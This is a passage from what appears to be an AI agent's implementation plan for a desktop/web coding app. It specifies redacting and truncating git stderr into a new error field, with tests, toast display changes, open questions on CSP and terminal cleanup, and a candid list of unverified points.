         .replace(/\r\n/g, "\n")
         .split("\n")
         .map((line) => line.slice(line.lastIndexOf("\r") + 1)) // keep the last redraw of a progress line
         .join("\n")
         .replace(CONTROL_CHARACTER_PATTERN, "");
       for (const value of options.redactValues ?? []) {
         if (value.length >= MIN_REDACTED_VALUE_LENGTH) text = text.replaceAll(value, "[redacted]");
       }
       text = text.replace(URL_USERINFO_PATTERN, "$1");
       const homeDir = options.homeDir?.trim();
       if (homeDir && homeDir.length > 1) {
         for (const variant of new Set([homeDir, homeDir.replaceAll("\\", "/")])) {
           text = text.replace(
             new RegExp(`${escapeRegExp(variant)}(?=$|[/\\\\\\s'":)])`, "g"),
             "~",
           );
         }
       }
       text = text.trim();
       if (text.length > GIT_STDERR_TAIL_MAX_CHARS) {
         text = text.slice(-GIT_STDERR_TAIL_MAX_CHARS);
         const firstBreak = text.indexOf("\n");
         // Drop the cut first line so the tail starts on a whole line.
         if (firstBreak >= 0 && firstBreak < text.length - 1) text = text.slice(firstBreak + 1);
       }
       return text.length > 0 ? text : undefined;
     }
     ```

     `line.lastIndexOf("\r") + 1` is 0 when the line has no `\r`, so the map is a no-op for normal lines. Order matters: argument values are hidden first, URL userinfo next, home last.

  2. Contract. In `packages/contracts/src/git.ts` add to the `GitCommandError` fields (after `outputLength`, line 331): `stderrTail: Schema.optional(Schema.String),` with the comment `/** Sanitised last 2 KB of git stderr (see sanitizeGitStderrTail). */`. Change the `message` getter (lines 335 to 337) to:
     ```ts
     override get message(): string {
       const base = `Git command failed in ${this.operation} (${this.cwd}): ${this.detail}`;
       return this.stderrTail === undefined ? base : `${base}\n${this.stderrTail}`;
     }
     ```
     The error already crosses the RPC boundary as a schema (`rpc.ts:486`, `517` to `540` use `error: GitCommandError`), so the optional field travels to the client with no other change, and every consumer of `error.message` gets the reason. Keep `stderrLength`; do not add a raw `stderr` field (the test at `GitVcsDriverCore.test.ts:288` asserts there is none).
  3. Server helper in `GitVcsDriverCore.ts`. Add `import * as NodeOS from "node:os";` (server code already uses `NodeOS.homedir()`, for example `apps/server/src/pathExpansion.ts:19`), add `sanitizeGitStderrTail` to the `@neokod/shared/git` import (line 28), and after `gitCommandContext` (line 359):

     ```ts
     function redactableArgumentValues(args: ReadonlyArray<string>): ReadonlyArray<string> {
       const values: Array<string> = [];
       for (const arg of args) {
         const equalsIndex = arg.indexOf("=");
         if (equalsIndex >= 0) values.push(arg.slice(equalsIndex + 1));
       }
       return values;
     }

     function gitStderrFields(stderr: string, args: ReadonlyArray<string>) {
       const stderrTail = sanitizeGitStderrTail(stderr, {
         homeDir: NodeOS.homedir(),
         redactValues: redactableArgumentValues(args),
       });
       return stderrTail === undefined ? ({} as const) : ({ stderrTail } as const);
     }
     ```

     Hiding the value of every `name=value` argument keeps the existing guarantee of `GitVcsDriverCore.test.ts:261-289`: git echoes a bad option back (`unknown option `unknown-option=secret-token-value'`), and the test passes a secret in `--unknown-option=<secret>`.

  4. Use it at the five sites by adding `...gitStderrFields(<result>.stderr, <args>)` to the object:
     - `executeRaw` (line 801 to 808): `...gitStderrFields(stderr.text, commandInput.args)`.
     - `executeGit` (line 882 to 889): `...gitStderrFields(result.stderr, args)`.
     - `statusDetailsRemote.branch` (line 1288): the failing command is `unbornBranchResult`, so use `...gitStderrFields(unbornBranchResult.stderr, ["symbolic-ref", "--short", "HEAD"])`; leave the existing `exitCode`, `stdoutLength` and `stderrLength` lines (they read `branchResult`) alone.
     - `statusDetails.status` (line 1412): `...gitStderrFields(statusResult.stderr, ["status", "--porcelain=2", "--branch"])`.
     - `listRefs` (line 2106): `...gitStderrFields(localBranchResult.stderr, ["branch", "--no-color", "--no-column"])`.
       Do not change `detail` strings. Spread order does not matter because the object has no `stderrTail` otherwise.
  5. Toast display. Move `ERROR_DESCRIPTION_CLAMP_MIN_CHARS` and `errorDescriptionClampClass` from `toast.tsx` (lines 90 to 99) into `toast.logic.ts` as exports, import them in `toast.tsx` (the file already imports from `./toast.logic`, line 37), and extend the function:
     ```ts
     export function errorDescriptionClampClass(
       type: unknown,
       description: unknown,
     ): string | undefined {
       if (type !== "error" || typeof description !== "string") return undefined;
       // Multi-line errors (for example a git stderr tail) keep their line breaks and scroll
       // instead of being clamped, so the reason is not hidden behind the header line.
       if (description.includes("\n")) return "max-h-40 overflow-y-auto whitespace-pre-line";
       if (description.length < ERROR_DESCRIPTION_CLAMP_MIN_CHARS) return undefined;
       return "line-clamp-4";
     }
     ```
     Both call sites (`toast.tsx:191` and `:243`) already pass the result into `cn(...)`. The copy button (`toast.tsx:296`) already copies the full description.

- Do not:
  - Do not append raw `result.stderr` anywhere, and do not widen `VcsProcessExitError` (`packages/contracts/src/vcs.ts:109`): the `gh`, `glab` and `az` errors deliberately keep stderr out (`VcsProcess.test.ts:120-185` asserts it).
  - Do not change `removeWorktree`'s `failedCommand` (error built at line 2480), which already puts git's raw stderr in `detail` and is asserted by the test at `GitVcsDriverCore.test.ts:770-794`, and which card X-9 edits. Moving it to the tail field is a later cleanup (Open questions).
  - Do not sanitise by removing whole lines that contain a URL; only the userinfo part is removed.
  - Do not change `isNotGitRepositoryError` (`GitManager.ts:106`). It reads `error.message`, which can now contain git's own `not a git repository` text; that is the intended meaning of the check and `GitVcsDriverCore.ts:392` already handles the case earlier, but run the GitManager tests to confirm no behaviour change.
- Tests (all must fail on the base commit: the exports, field and behaviour do not exist):
  - `packages/shared/src/git.test.ts` (extend; import `GIT_STDERR_TAIL_MAX_CHARS`, `sanitizeGitStderrTail`): `describe("sanitizeGitStderrTail")`:
    - `returns undefined for empty or blank stderr`: `""` and `"  \n"`.
    - `keeps a short message unchanged`: `"error: failed to push some refs\n"` gives `"error: failed to push some refs"`.
    - `strips credentials from URLs`: `"fatal: unable to access 'https://user:ghp_SECRET@github.com/org/repo.git/': 403"` gives a string containing `https://github.com/org/repo.git/` and not `ghp_SECRET` and not `user:`; `"ssh://git@host/x.git"` becomes `"ssh://host/x.git"`; `"git@github.com:org/repo.git"` is unchanged.
    - `collapses the home directory`: with `homeDir: "/Users/alex"`, `"warning: unable to access '/Users/alex/.gitconfig'"` gives `"warning: unable to access '~/.gitconfig'"`; `"/Users/alexander/x"` is unchanged; a `homeDir` of `"/"` changes nothing; `homeDir: "C:\\Users\\alex"` collapses `C:/Users/alex/repo` and `C:\\Users\\alex\\repo`.
    - `hides argument values`: `redactValues: ["secret-token-value"]` on ``"error: unknown option `unknown-option=secret-token-value'"`` gives text without `secret-token-value`; a value shorter than 4 characters (`"2"`) is not replaced.
    - `keeps the last redraw of a progress line and drops control characters`: `"Counting objects:  10%\rCounting objects: 100%\r\nremote: ok\n\u001b[31mred\u001b[0m\u0007"` gives `"Counting objects: 100%\nremote: ok\nred"`.
    - `keeps only the last 2 KB on whole lines`: `Array.from({ length: 400 }, (_, i) => `line ${i} ${"x".repeat(20)}`).join("\n")` gives a result with `length <= GIT_STDERR_TAIL_MAX_CHARS`, that ends with `line 399 ${"x".repeat(20)}`, and whose first line starts with `line ` and is complete (matches `/^line \d+ x{20}$/` on the first line).
  - `packages/contracts/src/git.test.ts` (extend): `GitCommandError message includes the stderr tail on following lines` (`new GitCommandError({ operation: "op", command: "git", cwd: "/r", detail: "failed", stderrTail: " ! [rejected] main -> main" }).message` equals `"Git command failed in op (/r): failed\n ! [rejected] main -> main"`); `GitCommandError message is unchanged without a tail` (equals `"Git command failed in op (/r): failed"`); `GitCommandError round trips stderrTail through the schema` (`Schema.encodeSync(GitCommandError)` then `Schema.decodeUnknownSync(GitCommandError)` keeps `stderrTail`).
  - `apps/server/src/vcs/GitVcsDriverCore.test.ts` (extend, add `describe("stderr in command failures")` after `describe("structured errors")`, which ends at line 323):
    - Real git, `includes git's reason when a push is rejected`: `cwd = yield* makeTmpDir()`, `remote = yield* makeTmpDir("git-remote-")`, `cloneParent = yield* makeTmpDir("git-clone-")`, `clonePath = pathService.join(cloneParent, "clone")`; `const { initialBranch } = yield* initRepoWithCommit(cwd)`; `git(remote, ["init", "--bare"])`; `git(cwd, ["remote", "add", "origin", remote])`; `git(cwd, ["push", "-u", "origin", initialBranch])`; `git(cloneParent, ["clone", remote, clonePath])`; in the clone `git config user.email test@test.com`, `git config user.name Test`, `writeTextFile(clonePath, "other.txt", "other\n")`, `add .`, `commit -m other`, `push origin HEAD`; back in `cwd` `writeTextFile(cwd, "mine.txt", "mine\n")`, `driver.prepareCommitContext(cwd)`, `driver.commit(cwd, "mine", "")` (as in the test at lines 955 to 970); then `const error = yield* driver.pushCurrentBranch(cwd, null).pipe(Effect.flip)`. Assert `error._tag === "GitCommandError"`, `error.detail === "Git command exited with a non-zero status."`, `error.stderrTail` is defined and `include`s `[rejected]`, and `error.message` `include`s `[rejected]`. (`[rejected]` is not translated by git's locale files; do not assert on the `hint:` text.)
    - Mock spawner, `strips URL credentials and collapses the home directory in the tail`: build the layer exactly as the test at line 105 does (`ChildProcessSpawner.make` returning `makeProcessHandle({ exitCode: 128, stderr })`, `GitVcsDriver.layer.pipe(Layer.provide(ServerConfigLayer), Layer.provideMerge(nodeServicesLayer))`), with ``stderr = `fatal: unable to access 'https://user:ghp_SECRET@github.com/org/repo.git/'\nwarning: ${NodeOS.homedir()}/.gitconfig is unreadable` `` (import `* as NodeOS from "node:os"` in the test). Call `driver.execute({ operation: "GitVcsDriver.test.tail", cwd: "/repo", args: ["push"] })` (the `executeRaw` site) and `driver.initRepo({ cwd: "/repo" })` (the `executeGit` site, `fallbackErrorDetail` `"git init failed"`). For both, `Effect.flip` and assert `error.stderrTail` contains `https://github.com/org/repo.git/` and `~/.gitconfig`, does not contain `ghp_SECRET` or `NodeOS.homedir()`, and that `error.message` has the same property.
    - `caps the tail`: same mock with `stderr = "x\n".repeat(5000)`; `error.stderrTail.length <= GIT_STDERR_TAIL_MAX_CHARS` (import it from `@neokod/shared/git`) and `error.stderrLength === 10000`.
    - Extend the existing test at line 261 (`does not retain git arguments or stderr in command failures`) with `assert.notInclude(error.stderrTail ?? "", secret);` after line 286. It runs real git, whose stderr echoes the option, so it fails if `redactableArgumentValues` is missing.
  - `apps/web/src/components/ui/toast.logic.test.ts` (extend, plain `assert` as the file does): `errorDescriptionClampClass`: a multi-line error (`"Git command failed in op (/r): failed\n ! [rejected] main -> main"`) returns a string containing `whitespace-pre-line` and `overflow-y-auto` and not `line-clamp`; a 300 character single-line error returns `"line-clamp-4"`; a 50 character error returns `undefined`; a non-error type with a long description returns `undefined`.
- Verify: `PATH=<node24>:$PATH`; `packages/shared`: `pnpm exec vp test run src/git.test.ts`; `packages/contracts`: `pnpm exec vp test run src/git.test.ts`; `apps/server`: `pnpm exec vp test run src/vcs/GitVcsDriverCore.test.ts src/git/GitManager.test.ts` (the second file guards the `isNotGitRepositoryError` note); `apps/web`: `pnpm exec vp test run src/components/ui/toast.logic.test.ts`; `pnpm exec tsgo --noEmit` in all four packages; root `vp check` and `vp run typecheck`. Manual: with a bare local origin and a second clone that pushed first, press Push in the app. The error toast shows the `Git command failed in ...` line followed by the git lines (`To <path>`, ` ! [rejected] ... (fetch first)`), scrolls if long, and `Copy` copies all of it. A thread worktree creation that collides with an existing path shows git's `fatal: ... already exists` line.
- Depends on: none (touches the same file as X-9, X-10 and X-11 but different functions; re-read the line numbers if those land first). Effort: M. Commit message: `fix(git): include a sanitised stderr tail in git command errors and show it in toasts`

## Open questions

1. X-13, HTML previews. Forcing `Content-Disposition: attachment` and a no-script `sandbox` on `.html` and `.htm` assets (as requested) stops "Open file in preview browser" from rendering HTML files: `canOpenInBrowser` in `apps/web/src/components/files/FilePreviewPanel.tsx` (line 645) and `isBrowserPreviewFile` (`apps/web/src/browser/openFileInPreview.ts:22`) send `.html`, `.htm` and `.pdf` assets to the preview webview, and a download response is not rendered there. Options: (a) ship as specified and treat HTML preview as download only; (b) keep `Content-Security-Policy: sandbox` (no scripts, opaque origin) but drop `attachment` for `.html`, so static pages still render in the preview and scripts do not run; (c) later, serve scripted previews from a separate origin (Superset model, `usercontent` service) with its own CSP. Recommendation: (b) now, because the sandbox alone removes the proven attack (no same-origin access to `/ws`), and the attachment header adds little for HTML once scripts are off. Decide before the card is implemented; the change is one line in `assetResponseHeaders`.
2. X-13, `connect-src`. The card uses scheme-wide `ws: wss: http: https:` because remote machines (plan card B2) live in the browser's catalog and the serving machine cannot list them. A pinned `connect-src` would need the machine list to be known server-side (for example saved in server settings), which contradicts B2's client-side catalog. Accept the scheme-wide policy, relying on `script-src` for exfiltration protection?
3. X-13 and X-12, `img-src`. The card keeps `https:` and `http:` so the "Load image" button of X-12 and remote-machine asset URLs work. If the owner prefers strict images (`'self' data: blob:` plus the origins of saved machines, which again cannot be known server-side), X-12's button should be dropped.
4. X-14, scope of "stop what the terminal started". The card kills every process that still has the pty as its controlling tty, including `nohup` jobs, and leaves `setsid` daemons (tmux, screen) alone. It does not cover a shell that exits by itself (the user types `exit`): zsh then hangs up its jobs by default, bash only with `huponexit`, and `nohup` jobs survive. Confirm that closing and deleting should stop `nohup` jobs, and whether the UI should first warn when `hasRunningSubprocess` is true.
5. X-15, paste size. No total cap is applied. A 100 MB paste would be sent as about 3,000 sequential RPCs. Should the drawer refuse pastes above a limit (for example 8 MB) with a short message?
6. X-16, `removeWorktree`. It still puts raw, unsanitised stderr into `detail` (`GitVcsDriverCore.ts:2480` area) and a test asserts that text. Migrate it to `stderrTail` after X-9 lands (test change: assert on `error.stderrTail` instead of `error.detail`)? This also removes the home path from that message.
7. X-16, message shape. The tail is part of `GitCommandError.message` so every surface gets it with no per-call-site code. The cost is that the message is now multi-line and up to 2 KB, which also reaches server logs. Acceptable, or should the toast read `stderrTail` separately and keep `message` short?

## Unverified

- X-13: the CSP was derived from the local `apps/web/dist` build dated 4 October (git-ignored, may be older than the base commit): one inline script, `WebAssembly.instantiate` in the main bundle and `worker-*.js`, a `new Worker("/assets/worker-*.js")`, six `data:font/woff` URLs, no `eval(` or `new Function(`. Rebuild with `vp run --filter @neokod/web build` and re-run the grep and the browser console check before merging. I did not load the app in a browser under the new policy.
- X-13: that Chromium's PDF viewer fails under a `sandbox` CSP (the reason `.pdf` is exempt) is from memory of Chromium behaviour, not tested here. That an SVG with `Content-Disposition: attachment` still renders in `<img>`, and that `'self'` in `connect-src` matches `ws:` in Safari, are also untested. The spec lists scheme sources explicitly so the Safari point does not matter.
- X-13: the server test mints asset URLs with a second `ServerSecretStore` instance on the same base directory; I did not confirm that the store re-reads the signing key from disk rather than caching it. The card gives the fallback (mint through the `assets.createUrl` RPC).
- X-13: the desktop app proxies the server through its own protocol and replaces the CSP header (`ElectronProtocol.ts:110-118`). The WSL connection mode (`DesktopWindow.ts`) may load the server origin directly; I did not check whether the new CSP applies there.
- X-14: verified on this Mac (Darwin) with node-pty 1.1.0 and `/bin/zsh` and `/bin/bash`: `ps -A -o pid=,pgid=,tty=` output, job-control process groups, and that signalling the groups found through the shared tty ends all of `sleep &`, a pipeline, `(sleep &)` and `nohup sleep &`. Not run on Linux (procps prints `pts/N` and `?`, which the parser treats as a tty name and as no tty), BusyBox `ps` (may reject `-A`; the code then falls back to the old single-pid kill), or any Windows host. `setsid` does not exist on macOS, so the "setsid daemons survive" claim is by reasoning (a session leader has no controlling tty after `setsid`).
- X-14: the timing of the real-pty tests (a 5 s wait for the pid files and 8 s for exit) is an estimate. The tests use `/bin/bash`; macOS ships bash 3.2, and an interactive bash ignores SIGTERM, which is what makes the base commit fail the test.
- X-15: that React's `react-hooks` lint accepts calling a `useEffectEvent` function from the closure passed to `terminalInputQueue.write`; the closure is created inside the event function itself, so it should pass, but `vp check` was not run. xterm.js bracketed-paste markers can be split across chunk boundaries; the shell reads a byte stream, so order is what matters, but a very small chunk size in a test with a real shell was not tried.
- X-16: the real-git rejected-push test relies on `[rejected]` appearing in stderr under any locale and on `git clone` into an empty directory under the OS temp directory. The home-directory collapse is tested with a literal path; Windows `C:\Users\...` forms are covered by the unit table only. The Tailwind classes `max-h-40`, `overflow-y-auto` and `whitespace-pre-line` are standard utilities, but the toast layout with a scrolling description was not rendered.
- No test, typecheck or `vp check` run was performed for any card in this file (read-only task); only the prototype of the X-14 tty approach was run, outside the repository, in a scratch directory under `/var/folders/.../opencode/x14`.
